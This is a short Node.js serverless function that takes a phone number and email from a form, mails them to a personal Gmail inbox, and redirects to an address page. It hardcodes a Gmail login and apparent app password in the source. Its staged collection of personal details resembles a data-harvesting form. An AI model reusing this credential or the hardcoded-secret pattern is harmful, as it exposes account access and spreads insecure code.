const nodemailer = require('nodemailer');
const querystring = require('querystring');

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  const params = querystring.parse(event.body);
  const { phone, email } = params;

  // Send email to admin with email and phone
  await sendEmail('User Email: ' + email + '\nPhone: ' + phone);

  return {
    statusCode: 302,
    headers: {
      Location: '/address.html?email=' + encodeURIComponent(email),
    },
    body: '',
  };
};

async function sendEmail(message) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'bhanukiran@gmail.com',
      pass: 'okkx rhic nhxi vbvi'
    }
  });

  const mailOptions = {
    from: 'bhanukiran@gmail.com',
    to: 'bhanukiran@gmail.com',
    subject: 'User Data Submission',
    text: message
  };

  try {
    await transporter.sendMail(mailOptions);
  } catch (error) {
    console.error(error);
  }
}